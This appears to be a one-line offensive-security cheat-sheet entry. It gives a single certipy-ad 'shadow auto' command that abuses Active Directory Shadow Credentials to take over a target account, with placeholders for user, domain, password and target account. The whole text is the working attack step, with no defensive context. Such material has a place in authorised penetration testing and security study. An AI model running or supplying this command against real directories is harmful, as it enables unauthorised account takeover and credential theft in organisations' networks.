Get shadow creds of target user:
```
certipy-ad shadow auto -username <username>@<domain> -p <password> -account <targetAccount>
```

